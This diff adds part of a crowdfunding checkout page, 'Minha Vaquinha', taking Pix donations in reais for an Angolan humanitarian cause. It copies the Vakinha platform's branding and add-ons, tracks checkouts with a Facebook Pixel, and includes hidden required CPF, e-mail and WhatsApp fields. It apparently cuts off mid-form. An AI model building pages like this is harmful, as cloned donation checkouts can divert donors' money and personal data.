@@ -1,0 +1,1453 @@
+
+  <meta charset="utf-8">
+  <!-- NOVO: meta viewport -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Contribuir para Organização humanitária de Angola – ação direta, dignidade e contas abertas. | Minha Vaquinha</title>
+  <link rel="stylesheet" href="css/style.css">
+  <link href="https://fonts.googleapis.com/css?family=Lato:400,700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:700&display=swap" rel="stylesheet">
+      <!-- Facebook Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1220399493274870');
+      fbq('track', 'PageView');
+      fbq('track', 'InitiateCheckout');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+           src="https://www.facebook.com/tr?id=1220399493274870&ev=PageView&noscript=1"/>
+    </noscript>
+    <style>
+    body {
+      font-family: 'Lato', Arial, sans-serif;
+      background: #fafafa;
+      margin: 0;
+      color: #282828;
+    }
+    .vakinha-header {
+      background: #fff;
+      border-bottom: 1px solid #eee;
+      margin-bottom: 0;
+      padding: 0;
+      height: 96px; /* antes 74px */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .vakinha-header .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 96px; /* antes 74px */
+    }
+    .vakinha-header .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .vakinha-header .logo-img {
+      height: 44px;
+      width: auto;
+      vertical-align: middle;
+    }
+    .vakinha-header nav {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      flex: 1;
+      margin-left: 40px;
+    }
+    .vakinha-header .nav-item {
+      font-size: 1.08em;
+      color: #222;
+      font-weight: bold;
+      cursor: pointer;
+      position: relative;
+      padding: 0 6px;
+      transition: color .2s;
+    }
+    .vakinha-header .nav-item:hover {
+      color: #00c853;
+    }
+    .vakinha-header .nav-item .arrow {
+      display: inline-block;
+      vertical-align: middle;
+      margin-left: 3px;
+      width: 18px;
+      height: 18px;
+    }
+    .vakinha-header .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 22px;
+    }
+    .vakinha-header .search-box {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      color: #00c853;
+      font-size: 1.08em;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .vakinha-header .search-icon {
+      width: 22px;
+      height: 22px;
+      vertical-align: middle;
+      margin-left: 2px;
+      margin-bottom: 2px;
+    }
+    .vakinha-header .account-link {
+      color: #00c853;
+      font-weight: bold;
+      font-size: 1.08em;
+      text-decoration: none;
+      transition: color .2s;
+    }
+    .vakinha-header .account-link:hover {
+      color: #009e3c;
+      text-decoration: underline;
+    }
+    .vakinha-header .btn-vakinha {
+      background: #00c853;
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 28px;
+      font-size: 1.08em;
+      cursor: pointer;
+      transition: background .2s;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+    }
+    .vakinha-header .btn-vakinha:hover {
+      background: #009e3c;
+    }
+    .checkout-wrapper {
+      width: 100%;
+      margin: 0;
+      background: transparent;
+      border-radius: 0;
+      box-shadow: none;
+      padding: 60px 0; /* remove padding lateral grande - centralizamos com .checkout-inner */
+      box-sizing: border-box;
+    }
+    /* container centralizado que contém todo o conteúdo do checkout */
+    .checkout-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 64px;
+      box-sizing: border-box;
+    }
+    /* garantir que título e subtítulo fiquem com espaçamento visual coerente */
+    .checkout-title {
+      margin-top: 6px;
+      margin-bottom: 18px;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      font-size: 2.7em;
+      color: #222;
+      letter-spacing: -1px;
+      text-align: left;
+      line-height: 1.1;
+    }
+    .checkout-sub {
+      color: #888;
+      font-size: 1em;
+      margin-bottom: 18px;
+    }
+    .checkout-form-row {
+      display: flex;
+      gap: 18px;
+      margin-bottom: 18px;
+    }
+    .checkout-form-row input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 1em;
+      background: #fafafa;
+      box-sizing: border-box;
+    }
+    .checkout-form-row label {
+      font-weight: bold;
+      margin-bottom: 4px;
+      display: block;
+      color: #222;
+      font-size: 1em;
+    }
+    .checkout-form-row .form-group {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    .checkout-form-row .form-group.short {
+      max-width: 180px;
+    }
+    .checkout-section {
+      margin-bottom: 22px;
+    }
+    .checkout-section label {
+      font-weight: bold;
+      color: #222;
+      font-size: 1em;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .checkout-value-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 18px;
+    }
+    .checkout-value-row input {
+      width: 120px;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 1.1em;
+      background: #fafafa;
+      box-sizing: border-box;
+      font-weight: bold;
+    }
+    .checkout-value-row span {
+      font-size: 1.1em;
+      color: #888;
+      font-weight: bold;
+    }
+    .checkout-payment-row {
+      display: flex;
+      gap: 18px;
+      margin-bottom: 18px;
+    }
+    .checkout-payment-row label {
+      font-weight: bold;
+      color: #222;
+      font-size: 1em;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .checkout-payment-options {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+    .checkout-payment-btn {
+      padding: 8px 22px;
+      border-radius: 6px;
+      border: 2px solid #00c853;
+      background: #fff;
+      color: #00c853;
+      font-weight: bold;
+      font-family: 'Montserrat', Arial, sans-serif;
+      cursor: pointer;
+      font-size: 1em;
+      transition: background .2s, color .2s;
+    }
+    .checkout-payment-btn.active,
+    .checkout-payment-btn:hover {
+      background: #00c853;
+      color: #fff;
+    }
+    .checkout-extras {
+      background: #eaffea;
+      border-radius: 12px;
+      padding: 4px 10px 10px 10px;
+      margin-bottom: 18px;
+      margin-top: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      box-sizing: border-box;
+    }
+    .checkout-extras-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 8px;
+      justify-content: flex-start;
+      background: none;
+      border-radius: 0;
+      padding: 0;
+      min-height: 38px;
+    }
+    .checkout-extras-row input[type="checkbox"] {
+      accent-color: #00c853;
+      width: 22px;
+      height: 22px;
+      margin-right: 8px;
+    }
+    .checkout-extras-label {
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      color: #fff;
+      font-size: 0.93em;
+      margin-right: 8px;
+      background: #00c853;
+      border-radius: 12px;
+      padding: 2px 10px;
+      display: inline-block;
+      letter-spacing: 0.5px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+    }
+    .checkout-extras-total {
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      color: #00c853;
+      font-size: 0.98em;
+      margin-left: auto;
+      margin-right: 0;
+      background: none;
+      border-radius: 0;
+      padding: 0;
+      align-self: center;
+    }
+    .checkout-extras-items {
+      display: flex;
+      gap: 12px;
+      flex-wrap: nowrap;
+      align-items: stretch;
+      margin-top: 0;
+      background: none;
+      border-radius: 0;
+      padding: 0;
+    }
+    .checkout-extras-item {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+      padding: 10px 12px 10px 12px;
+      font-size: 0.97em;
+      min-width: 0;
+      flex: 1 1 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-sizing: border-box;
+      position: relative;
+    }
+    .checkout-extras-item .extras-icon {
+      width: 24px;
+      height: 24px;
+      flex: 0 0 24px;
+      margin-right: 0;
+      margin-bottom: 0;
+      display: inline-block;
+    }
+    .checkout-extras-item .extras-content {
+      flex: 1;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: center;
+    }
+    .checkout-extras-item .extras-title {
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      color: #222;
+      font-size: 1em;
+      margin-bottom: 2px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .checkout-extras-item .extras-desc {
+      color: #444;
+      font-size: 0.95em;
+      margin-top: 2px;
+      margin-bottom: 0;
+      line-height: 1.3;
+      font-family: 'Lato', Arial, sans-serif;
+    }
+    .checkout-extras-item .extras-price,
+    .checkout-extras-item .extras-free {
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      font-size: 0.97em;
+      color: #00c853;
+      background: none;
+      border-radius: 0;
+      padding: 0;
+      margin-left: auto;
+      margin-right: 0;
+      position: static;
+      white-space: nowrap;
+      align-self: flex-start;
+    }
+    /* Responsivo */
+    @media (max-width: 900px) {
+      .checkout-extras {
+        padding: 2px 4px 8px 4px;
+      }
+      .checkout-extras-row {
+        gap: 6px;
+        margin-bottom: 6px;
+        min-height: 32px;
+      }
+      .checkout-extras-label {
+        font-size: 0.92em;
+        padding: 2px 8px;
+      }
+      .checkout-extras-total {
+        font-size: 0.95em;
+      }
+      .checkout-extras-items {
+        flex-direction: column;
+        gap: 8px;
+      }
+      .checkout-extras-item {
+        flex-direction: row;
+        min-width: 100%;
+        padding: 8px;
+      }
+      .checkout-extras-item .extras-icon {
+        width: 20px;
+        height: 20px;
+      }
+    }
+    .checkout-summary {
+      margin: 18px 0 12px 0;
+      font-size: 1.08em;
+      color: #222;
+    }
+    .checkout-total-row {
+      font-size: 1.15em;
+      font-weight: bold;
+      color: #222;
+      margin-bottom: 18px;
+    }
+    .checkout-checkbox-row {
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .checkout-checkbox-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #00c853;
+    }
+    .checkout-checkbox-row label {
+      font-size: 1em;
+      color: #222;
+      font-weight: 500;
+      margin-bottom: 0;
+    }
+    .checkout-btn {
+      background: #00c853;
+      color: #fff;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      padding: 16px 0;
+      font-size: 1.18em;
+      width: 100%;
+      cursor: pointer;
+      margin-bottom: 18px;
+      transition: background .2s;
+    }
+    .checkout-btn:hover {
+      background: #009e3c;
+    }
+    .checkout-security {
+      background: #f3f3f3;
+      border-radius: 12px;
+      padding: 12px 18px;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin-bottom: 18px;
+      font-size: 1em;
+      color: #222;
+    }
+    .checkout-security .security-img {
+      width: 110px;
+      height: 50px;
+      object-fit: contain;
+      display: inline-block;
+      margin-right: 0;
+    }
+    .checkout-security .security-label {
+      font-weight: 400;
+      color: #222;
+      font-size: 1em;
+      margin-left: 0;
+    }
+    @media (max-width: 900px) {
+      .checkout-security .security-img {
+        width: 140px;
+        height: 140px;
+      }
+      .checkout-security {
+        gap: 12px;
+      }
+    }
+    .checkout-terms {
+      font-size: 0.95em;
+      color: #888;
+      margin-bottom: 8px;
+    }
+    .checkout-note {
+      font-size: 0.92em;
+      color: #aaa;
+      margin-top: 4px;
+    }
+    /* Erros de validação */
+    .input-error {
+      border-color: #ff3b3b !important;
+      background: #fff6f6 !important;
+    }
+    .error-message {
+      color: #ff3b3b;
+      font-size: 0.97em;
+      margin-top: 2px;
+      margin-bottom: 0;
+      font-weight: 500;
+    }
+    /* Responsivo */
+    @media (max-width: 900px) {
+      .checkout-wrapper {
+        padding: 24px 6vw;
+      }
+      .checkout-form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+      .checkout-inner {
+        padding: 0 12px;
+      }
+      .checkout-title {
+        font-size: 2em;
+      }
+    }
+    /* ===== AJUSTE: TÍTULO MENOR NO MOBILE (CHECKOUT) ===== */
+    @media (max-width: 600px) {
+      .checkout-title {
+        font-size: 1.15em !important;
+        margin-bottom: 12px !important;
+        margin-top: 2px !important;
+        line-height: 1.15 !important;
+      }
+    }
+    /* Campo de valor (novo design) */
+    .amount-input-wrapper {
+      display:flex;
+      border:1px solid #cfcfcf;
+      border-radius:8px;
+      background:#fff;
+      width:100%;
+      max-width:420px;
+      overflow:hidden;
+      font-family:'Lato',Arial,sans-serif;
+    }
+    .amount-input-wrapper:focus-within {
+      border-color:#00c853;
+      box-shadow:0 0 0 3px rgba(0,200,83,0.15);
+    }
+    .currency-box {
+      background:#f2f2f2;
+      padding:12px 16px;
+      font-weight:600;
+      font-size:0.95em;
+      color:#333;
+      display:flex;
+      align-items:center;
+      border-right:1px solid #d9d9d9;
+      user-select:none;
+    }
+    #contrib-value {
+      flex:1;
+      border:0;
+      outline:none;
+      padding:12px 14px;
+      font-size:1.05em;
+      font-weight:700;
+      background:#fff;
+      letter-spacing:.5px;
+    }
+    #contrib-value::placeholder {
+      color:#9e9e9e;
+      font-weight:400;
+    }
+    #contrib-value.input-error {
+      background:#fff6f6;
+    }
+    .limit-hint {
+      font-size:0.75em;
+      color:#777;
+      margin-top:6px;
+    }
+    @media (max-width:900px){
+      .amount-input-wrapper {max-width:100%;}
+    }
+
+    /* ===== NOVO DESIGN PIX (MODERNO / RESPONSIVO) ===== */
+    .pix-payment-wrapper {
+      --bg:#ffffff;
+      --border:#e7e7e7;
+      --accent:#00c853;
+      --radius:18px;
+      display:flex;
+      gap:28px;
+      align-items:flex-start;
+      justify-content:center;
+      max-width:1100px;
+      margin:46px auto 0;
+      padding:26px 30px;
+      background:linear-gradient(135deg,#ffffff 0%,#f8fdf9 100%);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      box-shadow:0 10px 28px -8px rgba(0,0,0,0.15);
+    }
+    .pix-payment-wrapper .pix-card {
+      background:#fff;
+      border:1px solid #f0f0f0;
+      border-radius:16px;
+      padding:22px 24px 20px;
+      flex:1 1 360px;
+      display:flex;
+      flex-direction:column;
+      gap:18px;
+      position:relative;
+      box-shadow:0 6px 20px -6px rgba(0,0,0,0.12);
+    }
+    .pix-payment-wrapper .pix-left {
+      max-width:340px;
+      align-items:center;
+      text-align:center;
+      gap:16px;
+    }
+    .qr-badge {
+      background:var(--accent);
+      color:#fff;
+      font-family:'Montserrat',Arial,sans-serif;
+      font-weight:700;
+      font-size:.75em;
+      letter-spacing:.8px;
+      padding:6px 14px;
+      border-radius:24px;
+      box-shadow:0 4px 14px rgba(0,200,83,.35);
+      position:absolute;
+      top:-14px;
+      left:20px;
+    }
+    .qr-img {
+      width:230px;
+      height:230px;
+      border:10px solid #fff;
+      border-radius:18px;
+      background:#fafafa;
+      box-shadow:0 6px 18px rgba(0,0,0,0.10);
+    }
+    .btn-copy-inline {
+      background:#00c853;
+      color:#fff;
+      border:none;
+      border-radius:10px;
+      font-weight:700;
+      font-family:'Montserrat',Arial,sans-serif;
+      padding:12px 18px;
+      cursor:pointer;
+      font-size:.95em;
+      width:100%;
+      max-width:230px;
+      transition:background .2s;
+    }
+    .btn-copy-inline:hover { background:#009e3c; }
+    .expires {
+      font-size:.82em;
+      color:#666;
+      font-weight:600;
+    }
+    .pix-right .pix-title {
+      margin:0;
+      font-size:1.65em;
+      font-family:'Montserrat',Arial,sans-serif;
+      font-weight:700;
+      color:#222;
+      letter-spacing:-.5px;
+      line-height:1.2;
+    }
+    .pix-steps {
+      list-style:none;
+      margin:0;
+      padding:0;
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+      font-size:.95em;
+      color:#333;
+    }
+    .pix-steps li {
+      display:flex;
+      gap:10px;
+      line-height:1.35;
+      position:relative;
+      padding-left:28px;
+    }
+    .pix-steps li:before {
+      content:counter(step);
+      counter-increment:step;
+      position:absolute;
+      left:0;
+      top:0;
+      background:#00c853;
+      color:#fff;
+      width:22px;
+      height:22px;
+      border-radius:50%;
+      font-size:.72em;
+      font-weight:700;
+      font-family:'Montserrat',Arial,sans-serif;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 4px 10px rgba(0,200,83,.3);
+    }
+    .pix-right .pix-info-grid {
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+      gap:12px 18px;
+      background:#f6fdf7;
+      border:1px solid #e2f5e6;
+      padding:14px 16px;
+      border-radius:14px;
+      font-size:.85em;
+      color:#444;
+    }
+    .pix-right .pix-info-grid div {
+      display:flex;
+      flex-direction:column;
+      gap:4px;
+    }
+    .pix-right .pix-info-grid span {
+      font-weight:600;
+      color:#666;
+      font-size:.75em;
+      letter-spacing:.5px;
+      text-transform:uppercase;
+    }
+    .pix-right .pix-info-grid strong {
+      font-weight:700;
+      color:#222;
+      font-size:.95em;
+      word-break:break-word;
+    }
+    .pix-copia-cola {
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+    }
+    .pix-copia-cola label {
+      font-weight:700;
+      font-size:.85em;
+      font-family:'Montserrat',Arial,sans-serif;
+      color:#222;
+      letter-spacing:.5px;
+    }
+    .pix-copia-cola .code-row {
+      display:flex;
+      gap:10px;
+      align-items:center;
+    }
+    .pix-copia-cola input {
+      flex:1;
+      background:#fafafa;
+      border:1px solid #e3e3e3;
+      border-radius:10px;
+      padding:10px 12px;
+      font-size:.85em;
+      color:#222;
+      font-family:'Lato',Arial,sans-serif;
+      overflow:hidden;
+      text-overflow:ellipsis;
+      white-space:nowrap;
+    }
+    .pix-copia-cola button {
+      background:#00c853;
+      color:#fff;
+      border:none;
+      border-radius:10px;
+      font-weight:700;
+      font-family:'Montserrat',Arial,sans-serif;
+      padding:10px 16px;
+      cursor:pointer;
+      font-size:.75em;
+      letter-spacing:.5px;
+      height:42px;
+      flex:0 0 auto;
+      transition:background .2s;
+    }
+    .pix-copia-cola button:hover { background:#009e3c; }
+    .pix-status {
+      margin-top:4px;
+      font-size:.92em;
+      font-weight:700;
+      padding:10px 14px;
+      border-radius:12px;
+      display:inline-block;
+      background:#fff7e0;
+      color:#b86c00;
+      box-shadow:0 2px 8px rgba(0,0,0,0.06);
+    }
+    .pix-status.pago {
+      background:#e7fceb;
+      color:#0d7a32;
+      box-shadow:0 2px 10px rgba(0,150,60,0.18);
+    }
+    /* Ajuste ordem mobile: exibe copia e cola junto ao QR e oculta versão da direita */
+    .pix-copia-mobile {display:none;}
+    @media (max-width:600px){
+      .pix-payment-wrapper {flex-direction:column;}
+      .pix-left {order:1;}
+      .pix-right {order:2;}
+      .pix-right .pix-copia-cola {display:none !important;}
+      .pix-copia-mobile {display:flex;flex-direction:column;gap:8px;width:100%;margin-top:4px;}
+      .pix-copia-mobile label {
+        font-weight:700;font-size:.85em;font-family:'Montserrat',Arial,sans-serif;color:#222;letter-spacing:.5px;
+      }
+      .pix-copia-mobile .code-row {
+        display:flex;gap:10px;align-items:center;
+      }
+      .pix-copia-mobile input {
+        flex:1;background:#fafafa;border:1px solid #e3e3e3;border-radius:10px;padding:10px 12px;
+        font-size:.85em;color:#222;font-family:'Lato',Arial,sans-serif;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+      }
+      .pix-copia-mobile button {
+        background:#00c853;color:#fff;border:none;border-radius:10px;font-weight:700;
+        font-family:'Montserrat',Arial,sans-serif;padding:10px 16px;cursor:pointer;font-size:.75em;letter-spacing:.5px;height:42px;
+        transition:background .2s;
+      }
+      .pix-copia-mobile button:hover {background:#009e3c;}
+    }
+  </style>
+  <script>
+    function copyPixCode() {
+      var input = document.getElementById('pix-copy-input');
+      if (!input) return;
+      navigator.clipboard.writeText(input.value).then(function(){
+        var btn = document.getElementById('pix-copy-btn');
+        if (btn) {
+          btn.innerText = 'Copiado!';
+          setTimeout(()=>btn.innerText='COPIAR',1500);
+        }
+      });
+    }
+  </script>
+</head>
+<body class="is-desktop">
+<!-- === HEADER PADRÃO VAKINHA (RESPONSIVO, IGUAL campaign.php) === -->
+<div class="vakinha-header">
+  <div class="container">
+    <div class="logo-area">
+      <a href="index.php">
+        <img src="images/logo.png" alt="Minha Vaquinha" class="logo-img">
+      </a>
+    </div>
+    <nav>
+      <a class="nav-item" href="index.php">Início</a>
+      <a class="nav-item" href="explore.php">Explorar</a>
+      <a class="nav-item" href="howitworks.php">Como funciona</a>
+    </nav>
+    <div class="nav-right">
+      <button class="search-box" aria-label="Buscar">
+        <span class="search-label">Buscar</span>
+        <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="11" cy="11" r="7" stroke="#00c853" stroke-width="2"></circle>
+          <line x1="16.5" y1="16.5" x2="21" y2="21" stroke="#00c853" stroke-width="2" stroke-linecap="round"></line>
+        </svg>
+      </button>
+      <a class="account-link" href="login.php">Entrar</a>
+      <a class="btn-vakinha" href="create.php">Criar vaquinha</a>
+      <!-- botão menu (apenas mobile aparece) -->
+      <button class="menu-mobile" aria-label="Menu" style="display:block;">
+        <svg class="menu-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="6" y="9" width="20" height="2.5" rx="1.2" fill="#282828"></rect>
+          <rect x="6" y="15" width="20" height="2.5" rx="1.2" fill="#282828"></rect>
+          <rect x="6" y="21" width="20" height="2.5" rx="1.2" fill="#282828"></rect>
+        </svg>
+      </button>
+    </div>
+  </div>
+</div>
+<!-- === /vakinha-header === -->
+<script>
+  // Força responsividade do header igual campaign.php
+  (function(){
+    function isMobileDevice() {
+      var ua = navigator.userAgent || '';
+      var isMobileUA = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|BB10|IEMobile|Opera Mini|webOS|Kindle|Silk|PlayBook/i.test(ua);
+      var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      var isSmallScreen = window.innerWidth <= 700;
+      return isMobileUA || isTouch || isSmallScreen;
+    }
+    function applyHeaderMobile() {
+      var body = document.body;
+      var nav = document.querySelector('.vakinha-header nav');
+      var account = document.querySelector('.vakinha-header .account-link');
+      var btnVakinha = document.querySelector('.vakinha-header .btn-vakinha');
+      var menuBtn = document.querySelector('.vakinha-header .menu-mobile');
+      var searchLabel = document.querySelector('.vakinha-header .search-label');
+      if (isMobileDevice()) {
+        body.classList.add('is-mobile');
+        body.classList.remove('is-desktop');
+        if (nav) nav.style.display = 'none';
+        if (account) account.style.display = 'none';
+        if (btnVakinha) btnVakinha.style.display = 'none';
+        if (menuBtn) menuBtn.style.display = 'flex';
+        if (searchLabel) searchLabel.style.display = 'none';
+      } else {
+        body.classList.remove('is-mobile');
+        body.classList.add('is-desktop');
+        if (nav) nav.style.display = '';
+        if (account) account.style.display = '';
+        if (btnVakinha) btnVakinha.style.display = '';
+        if (menuBtn) menuBtn.style.display = 'none';
+        if (searchLabel) searchLabel.style.display = '';
+      }
+    }
+    applyHeaderMobile();
+    window.addEventListener('resize', applyHeaderMobile);
+  })();
+</script>
+
+  <!-- FORMULÁRIO (SEM CAMPOS DE DADOS PESSOAIS) -->
+  <div class="checkout-wrapper">
+    <div class="checkout-inner">
+      <div class="checkout-title"><strong>Organização humanitária de Angola – ação direta, dignidade e contas abertas.</strong></div>
+      <div class="checkout-sub">ID 5</div>
+      <!-- LOADING OVERLAY -->
+      <div id="pix-loading-overlay" style="display:none;position:fixed;z-index:99999;top:0;left:0;width:100vw;height:100vh;background:rgba(255,255,255,0.85);align-items:center;justify-content:center;flex-direction:column;">
+        <div style="font-size:2.2em;color:#00c853;font-family:'Montserrat',Arial,sans-serif;font-weight:700;margin-bottom:18px;">
+          Gerando Pix...
+        </div>
+        <div style="width:48px;height:48px;border:5px solid #e0e0e0;border-top:5px solid #00c853;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        <style>
+          @keyframes spin { 100% { transform: rotate(360deg); } }
+        </style>
+      </div>
+      <form id="checkoutForm" novalidate="">
+        <input type="hidden" name="utms" id="utms" value="">
+        <!-- VALOR DA CONTRIBUIÇÃO COM OPÇÕES PRÉ-SELECIONADAS -->
+        <div class="checkout-section">
+          <label for="contrib-value">Valor da contribuição</label>
+          <div class="amount-input-wrapper" style="margin-bottom:10px;">
+            <span class="currency-box">R$</span>
+            <input type="text" id="contrib-value" name="contrib-value" placeholder="0,00" value="0,00" inputmode="decimal" autocomplete="off" required="">
+          </div>
+          <div class="quick-values-row" style="display:flex;flex-wrap:wrap;gap:10px 10px;margin-bottom:8px;">
+                          <button type="button" class="quick-value-btn" data-value="30,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 30,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="50,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 50,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="75,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 75,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="100,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 100,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="200,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 200,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="500,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 500,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="750,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 750,00              </button>
+                          <button type="button" class="quick-value-btn" data-value="1.000,00" style="flex:1 1 45%;min-width:120px;padding:12px 0;font-size:1.08em;border:1.5px solid #e0e0e0;border-radius:10px;background:#fff;font-weight:600;color:#222;cursor:pointer;transition:.15s;">
+                R$ 1.000,00              </button>
+                      </div>
+          <div class="limit-hint">Mínimo R$ 30,00 - Máximo R$ 1.000,00</div>
+          <div id="value-error" class="error-message" style="display:none;">
+            Valor deve estar entre R$ 30,00 e R$ 1.000,00          </div>
+        </div>
+        <script>
+        // Valor rápido: ao clicar, preenche o campo e dispara evento de input
+        document.addEventListener('DOMContentLoaded', function(){
+          var btns = document.querySelectorAll('.quick-value-btn');
+          var input = document.getElementById('contrib-value');
+          btns.forEach(function(btn){
+            btn.addEventListener('click', function(){
+              var v = btn.getAttribute('data-value');
+              if(input){
+                input.value = v;
+                input.dispatchEvent(new Event('input', {bubbles:true}));
+                input.dispatchEvent(new Event('blur', {bubbles:true}));
+                input.focus();
+              }
+              // destaque visual
+              btns.forEach(b=>b.style.borderColor='#e0e0e0');
+              btn.style.borderColor='#00c853';
+            });
+          });
+        });
+        </script>
+        <!-- ===== NOVO: CAMPOS DE DADOS PESSOAIS (OCULTOS) ===== -->
+        <div class="checkout-section" style="display:none;">
+          <label>Nome</label>
+          <input type="text" name="nome" value="" required="">
+          <label>E-mail</label>
+          <input type="email" name="email" value="" required="">
+          <label>CPF</label>
+          <input type="text" name="cpf" value="" required="">
+          <label>WhatsApp</label>
+          <input type="text" name="whatsapp" value="" required="">
+        </div>
+        <!-- ===== /novos campos ocultos ===== -->
+        <div class="checkout-section">
+          <label>Forma de pagamento</label>
+          <div class="checkout-payment-options">
+            <button type="button" class="checkout-payment-btn active">Pix</button>
+          </div>
+        </div>
+        <div class="checkout-extras">
+          <!-- removido checkbox único; cada item terá seu próprio checkbox -->
+          <div class="checkout-extras-items">
+            <div class="checkout-extras-item" style="align-items:center;">
+              <input type="checkbox" class="extra-checkbox" id="extra-luck" name="extra_luck" data-amount="10.99" style="margin-right:10px;">
+              <img src="images/luck.png" alt="Sorte" class="extras-icon">
+              <div class="extras-content">
+                <div class="extras-title">3 números da sorte</div>
+                <div class="extras-desc">Você e quem criou a vaquinha concorrem ao sorteio de R$ 15.000,00 do Vakinha Premiada</div>
+              </div>
+              <div class="extras-price">R$ 10,99</div>
+            </div>
+            <div class="checkout-extras-item" style="align-items:center;">
+              <input type="checkbox" class="extra-checkbox" id="extra-heart" name="extra_heart" data-amount="24.90" style="margin-right:10px;">
+              <img src="images/cora.png" alt="Corações" class="extras-icon">
+              <div class="extras-content">
+                <div class="extras-title">3 Corações</div>
+                <div class="extras-desc">Destacam essa vaquinha na plataforma</div>
+              </div>
+              <div class="extras-price">R$ 24,90</div>
+            </div>
+            <div class="checkout-extras-item" style="align-items:center;">
+              <input type="checkbox" class="extra-checkbox" id="extra-cause" name="extra_cause" data-amount="58.90" style="margin-right:10px;">
+              <img src="images/doar.png" alt="Tempo de Doar" class="extras-icon">
+              <div class="extras-content">
+                <div class="extras-title">Vakinha além do Câncer</div>
